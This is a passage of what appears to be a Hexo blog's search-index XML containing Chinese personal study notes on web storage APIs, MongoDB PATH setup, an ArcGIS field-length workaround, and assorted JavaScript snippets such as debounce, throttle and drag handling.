属性允许你访问一个，对应当前源的 session <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage" target="_blank" rel="noopener"><code>Storage</code></a> 对象。它与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage" target="_blank" rel="noopener"><code>localStorage</code></a> 相似，不同之处在于 <code>localStorage</code> 里面存储的数据没有过期时间设置，而存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被清除。</p><ul><li>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</li><li><strong>在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，</strong>这点和 session cookies 的运行方式不同。</li><li>打开多个相同的 URL 的 Tabs 页面，会创建各自的 <code>sessionStorage</code>。</li><li>关闭对应浏览器标签或窗口，会清除对应的 <code>sessionStorage</code>。 </li></ul><h3 id="用法"><a href="#用法" class="headerlink" title="用法:"></a>用法:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存数据到 sessionStorage</span></span><br><span class="line">sessionStorage.setItem(<span class="string">'key'</span>, <span class="string">'value'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 获取数据</span></span><br><span class="line"><span class="keyword">let</span> data = sessionStorage.getItem(<span class="string">'key'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 删除保存的数据</span></span><br><span class="line">sessionStorage.removeItem(<span class="string">'key'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 删除所有保存的数据</span></span><br><span class="line">sessionStorage.clear();</span><br></pre></td></tr></table></figure><h2 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage" target="_blank" rel="noopener">Window.localStorage - Web API 接口参考 | MDN (mozilla.org)</a></p><p>只读的<code>localStorage</code> 属性允许你访问一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document" target="_blank" rel="noopener"><code>Document</code></a> 源（origin）的对象 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage" target="_blank" rel="noopener"><code>Storage</code></a>；存储的数据将保存在浏览器会话中。<code>localStorage</code> 类似 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage" target="_blank" rel="noopener"><code>sessionStorage</code></a>，但其区别在于：存储在 <code>localStorage</code> 的数据可以长期保留；而当页面会话结束——也就是说，当页面被关闭时，存储在 <code>sessionStorage</code> 的数据会被清除 。</p><p>应注意，无论数据存储在 <code>localStorage</code> 还是 <code>sessionStorage</code> ，<strong>它们都特定于页面的协议。</strong></p><p>另外，<code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).</p><h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><p>该语法用于设置 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem(<span class="string">'myCat'</span>, <span class="string">'Tom'</span>);</span><br></pre></td></tr></table></figure><p>该语法用于读取 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cat = localStorage.getItem(<span class="string">'myCat'</span>);</span><br></pre></td></tr></table></figure><p>该语法用于移除 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.removeItem(<span class="string">'myCat'</span>);</span><br></pre></td></tr></table></figure><p>该语法用于移除所有的 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移除所有</span></span><br><span class="line">localStorage.clear();</span><br></pre></td></tr></table></figure><h2 id="三者关系"><a href="#三者关系" class="headerlink" title="三者关系"></a>三者关系</h2><p>表格转自<a href="https://juejin.cn/post/6844903989096497159" target="_blank" rel="noopener">localStorage、sessionStorage、cookie、session几种web数据存储方式对比总结</a></p><table><thead><tr><th>分类</th><th>生命周期</th><th>存储容量</th><th>存储位置</th></tr></thead><tbody><tr><td>cookie</td><td>默认保存在内存中，随浏览器关闭失效（如果设置过期时间，在到过期时间后失效）</td><td>4KB</td><td>保存在客户端，每次请求时都会带上</td></tr><tr><td>localStorage</td><td>理论上永久有效的，除非主动清除。</td><td>4.98MB（不同浏览器情况不同，safari 2.49M）</td><td>保存在客户端，不与服务端交互。节省网络流量</td></tr><tr><td>sessionStorage</td><td>仅在当前网页会话下有效，关闭页面或浏览器后会被清除。</td><td>4.98MB（部分浏览器没有限制）</td><td>保存在客户端，不与服务端交互。节省网络流量</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB环境配置过程</title>
      <link href="/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/"/>
      <url>/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB配置过程"><a href="#MongoDB配置过程" class="headerlink" title="MongoDB配置过程"></a>MongoDB配置过程</h1><p>环境变量配置</p><p>右键”计算机”，点击”属性“，下拉选择”高级系统设置“→”环境变量“，在”系统变量“中双击”Path“，在后面添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\MongoDB\Server\5.0\bin</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/image-20220211160446805.png" alt="image-20220211160446805"></p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/image-20220211160738853.png" alt="image-20220211160738853"></p>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决arcgis字段长度限制</title>
      <link href="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/"/>
      <url>/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="解决arcgis字段长度限制"><a href="#解决arcgis字段长度限制" class="headerlink" title="解决arcgis字段长度限制"></a>解决arcgis字段长度限制</h1><p>在一般的shp文件<img src= "/img/loading.gif" data-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319092734837.png" alt="image-20220319092734837">下修改文本字段的长度，只要超过255，通常会现实这样一个错误</p><p><img src= "/img/loading.gif" data-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319092714321.png" alt="image-20220319092714321"></p><p>解决方法为，新建一个个人地理数据库，再将该shp文件放到该数据库下，重新在该文件下的<code>属性</code>窗口修改文本字段的长度，现在无论你输入多少，都可以修改成功</p><p><img src= "/img/loading.gif" data-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319092544606.png" alt="image-20220319092544606"></p><p><img src= "/img/loading.gif" data-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319093201270.png" alt="image-20220319093201270"></p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端知识小汇总</title>
      <link href="/2022/03/05/study/"/>
      <url>/2022/03/05/study/</url>
      
        <content type="html"><![CDATA[<h1 id="前端知识"><a href="#前端知识" class="headerlink" title="前端知识"></a>前端知识</h1><p>🔴重点🟠难点🟡性能🟢算法🔵JS高阶🟣框架</p><h2 id="JS知识点"><a href="#JS知识点" class="headerlink" title="JS知识点"></a>JS知识点</h2><ol><li><p>get、post（请求参数长度限制）——HTTP协议</p><ol><li><a href="https://juejin.cn/post/6844903433674178574" target="_blank" rel="noopener">两者区别</a></li><li><a href="https://juejin.cn/post/6992933721703710750" target="_blank" rel="noopener">GET 和 POST</a></li></ol></li><li><p>原型链</p><ol><li><p>gitee -&gt; 原型链代码</p></li><li><p>processOn <a href="https://mp.processon.com/view/link/604b5ac963768958e9989002#map" target="_blank" rel="noopener">思维导图</a></p><p><img src= "/img/loading.gif" data-src="/2022/03/05/study/image-20211217103257781.png" alt="image-20211217103257781"></p></li></ol></li><li><p>mouseover、mouseenter</p><ol><li><p><a href="https://blog.csdn.net/LPLIFE/article/details/80436623" target="_blank" rel="noopener">文章</a></p></li><li><p>共同点：鼠标移入元素触发事件</p></li><li><p>不同点：</p><ul><li><p>mouseover：若存在子元素，则会冒泡触发多次mouseover事件</p><p><img src= "/img/loading.gif" data-src="/2022/03/05/study/mouseover.gif" alt="mouseover"></p></li><li><p>mouseenter：不存在子元素冒泡，也就是鼠标移入只会触发一次mouseenter事件</p><p><img src= "/img/loading.gif" data-src="/2022/03/05/study/mouseenter.gif" alt="mouseenter"></p></li></ul></li></ol></li><li><p><a href="https://juejin.cn/post/6844904126199889927" target="_blank" rel="noopener">可视区域高度</a></p><p><img src= "/img/loading.gif" data-src="/2022/03/05/study/js%E8%8E%B7%E5%8F%96%E5%B1%8F%E5%B9%95%E5%B0%BA%E5%AF%B8.png" alt></p><p>可视区域就是不包括上下左右的工具栏、状态栏（滚动条特殊）。代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可视区域宽度</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.clientWidth</span><br><span class="line"><span class="built_in">document</span>.body.clientWidth</span><br><span class="line"><span class="comment">//可视区域高度</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.clientHeight</span><br><span class="line"><span class="built_in">document</span>.body.clientHeight</span><br></pre></td></tr></table></figure><p>document.documentElement也可以为document.body</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//水平滚动条的位置</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.scrollLeft</span><br><span class="line"><span class="comment">//垂直滚动条位置</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.scrollRight</span><br></pre></td></tr></table></figure></li><li><p>defer（异步加载js)</p><ol><li><a href="https://juejin.cn/post/6844903560879013896" target="_blank" rel="noopener">defer和async</a></li><li><a href="https://juejin.cn/post/6894629999215640583" target="_blank" rel="noopener">defer和async简洁版</a></li></ol></li><li><p>防抖节流</p><ol><li><p>防抖（高阶）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">method, context, param</span>) </span>&#123;</span><br><span class="line">        clearTimeout(method.tId);</span><br><span class="line">        method.tId = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          method.apply(context, param);</span><br><span class="line">        &#125;, <span class="number">500</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li><li><p>防抖（闭包型）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">method, time</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> out = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> that = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">          clearTimeout(out);</span><br><span class="line">          out = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            method.call(that, args);</span><br><span class="line">          &#125;, time);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li><li><p>节流（自定义）</p><p><a href="https://juejin.cn/post/6844903669389885453" target="_blank" rel="noopener">参考文章</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throlle</span>(<span class="params">method, timeout = <span class="number">1000</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> out;</span><br><span class="line">  <span class="keyword">let</span> last;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">if</span> (now - last &lt; timeout) &#123;</span><br><span class="line">      clearTimeout(out);</span><br><span class="line">      out = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        method(...args);</span><br><span class="line">      &#125;, timeout);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      last = now;</span><br><span class="line">      method(...args);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>事件流</p><ol><li><p><a href="https://juejin.cn/post/6844903741783556109" target="_blank" rel="noopener">JS事件流和事件委托</a></p></li><li><p><a href="https://juejin.cn/post/6844903834075021326" target="_blank" rel="noopener">你真的理解 事件冒泡 和 事件捕获</a>吗</p></li><li><p>阻止冒泡,阻止默认事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c.addEventListener(</span><br><span class="line">  <span class="string">'click'</span>,</span><br><span class="line">  e =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'c 冒泡'</span>);</span><br><span class="line">    e.stopPropagation();<span class="comment">//阻止冒泡</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span><span class="comment">//阻止默认事件</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>注意：<code>return false</code> 不仅阻止了事件往上冒泡，而且阻止了事件本身(默认事件)。<code>event.stopPropagation()</code>则只阻止事件往上冒泡，不阻止事件本身</p></blockquote></li><li><p><a href="https://juejin.cn/post/6844903450493321223" target="_blank" rel="noopener">javascript 事件流</a></p></li></ol></li><li><p>JS拖拽</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拖动开始--&gt;拖动过程中--&gt;拖动结束</span></span><br><span class="line"><span class="comment">// 监听目标DOM的onmousedown事件→document的onmousemove→document的onmouseup</span></span><br><span class="line"><span class="comment">//记录旧坐标鼠标移动后记录下新坐标,通过新坐标减去旧坐标得出变化的坐标,然后改变其位置</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">drag</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> oldX, oldY, newX, newY; <span class="comment">//存储新旧鼠标位置</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 元素点击事件</span></span><br><span class="line">  ele.onmousedown = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    oldX = e.clientX; <span class="comment">//存储鼠标当前位置(初始化位置)</span></span><br><span class="line">    oldY = e.clientY;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.style.left &amp;&amp; !<span class="keyword">this</span>.style.top) &#123;</span><br><span class="line">      <span class="comment">//如果元素无初始值,则需要赋值</span></span><br><span class="line">      <span class="keyword">this</span>.style.left = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">this</span>.style.top = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 鼠标移动事件</span></span><br><span class="line">    <span class="built_in">document</span>.onmousemove = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">      newX = e.clientX; <span class="comment">//存储移动后的鼠标位置</span></span><br><span class="line">      newY = e.clientY;</span><br><span class="line">      <span class="comment">// 移动后的位置 = 当前位置 - (移动后的鼠标位置-移动前的鼠标位置)</span></span><br><span class="line">      ele.style.top = <span class="built_in">parseFloat</span>(ele.style.top) + (newY - oldY) + <span class="string">'px'</span>;</span><br><span class="line">      ele.style.left = <span class="built_in">parseFloat</span>(ele.style.left) + (newX - oldX) + <span class="string">'px'</span>;</span><br><span class="line"></span><br><span class="line">      oldX = newX; <span class="comment">//移动完后旧鼠标位置为新鼠标位置</span></span><br><span class="line">      oldY = newY;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 鼠标松开事件</span></span><br><span class="line">    <span class="built_in">document</span>.onmouseup = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">// 解绑事件</span></span><br><span class="line">      <span class="built_in">document</span>.onmousemove = <span class="literal">null</span>;</span><br><span class="line">      <span class="built_in">document</span>.onmouseup = <span class="literal">null</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>js drag api</p><p><a href="https://www.cnblogs.com/moqiutao/p/6365113.html" target="_blank" rel="noopener">HTML5 拖放（Drag 和 Drop）详解与实例 - 风雨后见彩虹 - 博客园 (cnblogs.com)</a></p><p>在被拖动的元素上需定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./PoinkoParrot2.jpeg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"draggable"</span> <span class="attr">draggable</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在拖放的过程中会触发以下事件：</p><ul><li><p>在拖动目标上触发事件(源元素):</p><ul><li>ondragstart - 用户开始拖动元素时触发</li><li>ondrag - 元素正在拖动时触发</li><li>ondragend - 用户完成元素拖动后触发</li></ul></li><li><p>释放目标时触发的事件:</p><ul><li>ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件</li><li>ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件</li><li>ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件</li><li>ondrop - 在一个拖动过程中，释放鼠标键时触发此事件</li></ul></li></ul></li><li><p>eval</p><ul><li><a href="https://juejin.cn/post/6938775708739207182" target="_blank" rel="noopener">Eval</a></li><li><a href="https://juejin.cn/post/6844903713140637709" target="_blank" rel="noopener">你不知道的 eval</a></li><li><a href="https://juejin.cn/post/6954380745871720462" target="_blank" rel="noopener">欺骗词法 eval 和 with</a></li></ul></li><li><p>AMD、CMD、CommonJs</p><ul><li><a href="https://es6.ruanyifeng.com/#docs/module-loader" target="_blank" rel="noopener">Module 的加载实现 - ECMAScript 6入门</a></li><li><a href="https://juejin.cn/post/6844903576309858318" target="_blank" rel="noopener">前端模块化：CommonJS,AMD,CMD,ES6</a></li></ul></li><li><p>🟠js监听对象属性改变（vue属性监听）</p><ul><li><a href="https://juejin.cn/post/6844903842828533767" target="_blank" rel="noopener">论如何监听一个对象某个属性的变化</a></li></ul></li><li><p>JS实现跨域</p><ul><li><a href="https://ypigy.gitee.io/2020/07/20/AJAX/#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93" target="_blank" rel="noopener">笔记</a></li></ul></li><li><p>JS深度拷贝（浅拷贝、深拷贝…）</p><p><img src= "/img/loading.gif" data-src="/2022/03/05/study/image-20211222145748666.png" alt="image-20211222145748666"></p></li><li><p>重排重绘</p><ul><li><a href="https://juejin.cn/post/6844903745914929165" target="_blank" rel="noopener">浏览器重绘(repaint)重排(reflow)与优化</a></li></ul></li><li><p>🟠JS全排列</p><ul><li><p><a href="https://juejin.cn/post/6844904191379374087" target="_blank" rel="noopener">前端电商 sku 的全排列算法很难吗？学会这个套路，彻底掌握排列组合</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> combine = <span class="function"><span class="keyword">function</span> (<span class="params">...chunks</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">let</span> helper = <span class="function"><span class="keyword">function</span> (<span class="params">chunkIndex, prev</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = chunks[chunkIndex];</span><br><span class="line">    <span class="keyword">let</span> isLast = chunkIndex === chunks.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> val <span class="keyword">of</span> chunk) &#123;</span><br><span class="line">      <span class="keyword">let</span> cur = prev.concat(val);</span><br><span class="line">      <span class="keyword">if</span> (isLast) &#123;</span><br><span class="line">        <span class="comment">// 如果已经处理到数组的最后一项了 则把拼接的结果放入返回值中</span></span><br><span class="line">        res.push(cur); <span class="comment">//将最后一个数组的所有选项分别压入</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        helper(chunkIndex + <span class="number">1</span>, cur);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 从属性数组下标为 0 开始处理</span></span><br><span class="line">  <span class="comment">// 并且此时的 prev 是个空数组</span></span><br><span class="line">  helper(<span class="number">0</span>, []);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> names = [<span class="string">'iPhone X'</span>, <span class="string">'iPhone XS'</span>];</span><br><span class="line">  <span class="keyword">let</span> colors = [<span class="string">'黑色'</span>, <span class="string">'白色'</span>];</span><br><span class="line">  <span class="keyword">let</span> storages = [<span class="string">'64g'</span>, <span class="string">'256g'</span>];</span><br><span class="line">  <span class="keyword">let</span> res = combine(names, colors, storages);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">  <span class="comment">/* result</span></span><br><span class="line"><span class="comment">  [</span></span><br><span class="line"><span class="comment">    [ 'iPhone X', '黑色', '64g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone X', '黑色', '256g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone X', '白色', '64g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone X', '白色', '256g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone XS', '黑色', '64g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone XS', '黑色', '256g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone XS', '白色', '64g' ],</span></span><br><span class="line"><span class="comment">    [ 'iPhone XS', '白色', '256g' ]</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>  <img src= "/img/loading.gif" data-src="/2022/03/05/study/image-20211224151929493.png" alt="image-20211224151929493"></p></li></ul></li><li><p>this指向、隐式丢失、显式绑定</p><ul><li><a href="https://juejin.cn/post/6844904113352736776" target="_blank" rel="noopener">this绑定的四种方式：new，显式，隐式，默认</a></li></ul></li><li><p>🟠virtual dom</p><ul><li><a href="https://juejin.cn/post/6844903609667321863" target="_blank" rel="noopener">探索Virtual DOM的前世今生</a></li><li><a href="https://juejin.cn/post/6844903615652610055" target="_blank" rel="noopener">深入框架本源系列 —— Virtual Dom</a></li><li><a href="https://juejin.cn/post/6844903921442422791" target="_blank" rel="noopener">面试官问: 如何理解Virtual DOM？</a></li></ul></li><li><p>vue生命周期</p></li><li><p>🔴🟠Promise底层实现</p></li><li><p>事件监听</p><ul><li><a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener">HTML DOM 事件对象</a></li><li><a href="https://juejin.cn/post/6844903886960984072" target="_blank" rel="noopener">一篇文章能否解决你事件监听的许多疑问</a></li><li>🔴🔵<a href="https://juejin.cn/post/6844903647197790221" target="_blank" rel="noopener">撸一个JS的事件管理</a></li><li>🔵<a href="https://juejin.cn/post/6844904069820055560" target="_blank" rel="noopener">🔥JavaScript 自定义事件如此简单！</a></li></ul></li><li><p>Generator</p><ul><li><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023024381818112" target="_blank" rel="noopener">generator</a></p></li><li><p>基本使用</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generator</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">yield</span> x + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> res = foo(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(res.next());<span class="comment">//&#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(res.next());<span class="comment">//&#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(res.next());<span class="comment">//&#123; value: 4, done: true &#125;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p>生成自增id函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 